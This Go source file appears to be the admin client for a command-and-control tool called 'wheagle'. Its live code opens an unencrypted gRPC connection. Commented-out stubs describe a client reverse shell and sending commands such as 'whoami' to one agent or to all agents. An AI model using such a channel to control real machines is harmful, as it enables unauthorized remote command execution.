package lib

import (
  "fmt"
  "odin/wheagle/server/grpcapi"
  "google.golang.org/grpc"
)

// An admin client should be able all client connection protocol methods
type AdminClientWrapper struct {
  AClient grpcapi.AdminClient
  Conn *grpc.ClientConn
}

func InitializeAdminClient(address string,secure bool) (*AdminClientWrapper,error){
  var (
    opts []grpc.DialOption
    client grpcapi.AdminClient
  )
  opts = append(opts,grpc.WithMaxMsgSize(2 * 1024 * 1024 * 1024))
  if secure {
    return nil,fmt.Errorf("To be implemented soon")
  }
  opts = append(opts,grpc.WithInsecure())
  conn,err := grpc.Dial(address,opts...)
  if err != nil{
    return nil,err
  }
  client = grpcapi.NewAdminClient(conn)
  return &AdminClientWrapper {
    AClient: client,
    Conn: conn,
  },nil
}

func (aw *AdminClientWrapper) Close() error{
  return aw.Conn.Close()
}

/* define here a function that runs the client reverseshell
func (srv *AdminClientWrapper) RunClientReverseShell(stream grpcapi.Admin_RunClientReverseShellClient)error{
  return nil
}*/
/*
func WheagleCNC(){
  var (
    opts []grpc.DialOption
    conn *grpc.ClientConn
    err error
    client grpcapi.AdminClient
  )

  opts = append(opts,grpc.WithInsecure())
  if conn,err = grpc.Dial(fmt.Sprintf("localhost:%d",45566),opts...); err != nil{
    utils.Logerror(err)
  }
  defer conn.Close()
  client = grpcapi.NewAdminClient(conn)
  // just let this func return an rpc client to ac2 then then for each cmd let the client run the command
  var cmd = new(grpcapi.Command)
  /* from somewhere here I am supposed to
    1. Get command from cli
    2. Set it into cmd.In
    3. If it's individual make it for that agent alone
    4. make it to all
    5. Get the output and print it out or whatever we'll figure it out

  cmd.In = "whoami"
  ctx := context.Background()
  //RunAC2Command the same way only in the background
  cmd,err = client.RunCommand(ctx,cmd)
  if err != nil {
    utils.Logerror(err)
  }
  fmt.Println(cmd.Out)
}

/* addd a provision for tls client
func CreateInsecureAdminClient(c2Address string) (*grpcapi.AdminClient,error){
  var (
    opts []grpc.DialOption
    conn *grpc.ClientConn
    err error
    client grpcapi.AdminClient
  )
  opts = append(opts,grpc.WithInsecure())
  if conn,err = grpc.Dial(c2Address,opts...); err != nil{
    return nil,err
  }
  defer conn.Close()
  client = grpcapi.NewAdminClient(conn)
  return &client,nil
}
*/
